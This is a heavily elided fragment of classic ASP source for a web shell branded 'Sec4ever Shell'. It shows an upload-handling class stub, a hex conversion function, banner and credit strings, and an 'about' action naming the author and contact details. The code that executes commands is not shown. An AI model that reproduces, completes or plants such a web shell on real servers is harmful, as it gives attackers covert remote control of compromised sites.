...
Class UploadedFile
	...
	End Sub
End Class
startcode = "<html><head><title>.:: Sec4ever Shell ::.</title></head><body>"
endocde = "</body></html>"
onlinehelp = "<font face=""arial"" size=""1"">.:: <a href=""http://wWw.sEc4ever.Com"" target=""_blank"">ONLINE HELP</a> ::.</font><br>"
Function HexConv(hexVar)
	Dim hxx, hxx_var, multiply          
         ...
         END IF
End Function
cprthtml = "<font face='arial' size='1'>.:: Sec4ever 1.0  ::.</font>"
...
keydec="<font face='arial' size='1'>.:: SeC4EvER Asp Shell &copy; BY <a href='mailto:'>Ma3sTr0-Dz</a> - <a href='' target='_blank'></a> ::.</font>"
...
Select Case Trim(Request.QueryString("action"))
	...
	Case "about"
		...
		checa = checking(cprthtml,keydec)
		Call hdr()
		response.Write "<br><br><br><body topmargin=5 leftmargin=0><center><h4>Coded By Ma3sTr0-DZ"
		response.Write "<br><br>"
		response.Write "<font size=2 color=Red face='courier new'>WebSite: :) wWW.SEC4EVER.Com</font>"
		response.Write "<br>"
		response.Write "<font size=2 color=Red face='courier new'>E-Mail: o5m@hotmail.de</font>"
		response.Write "<br><br>"
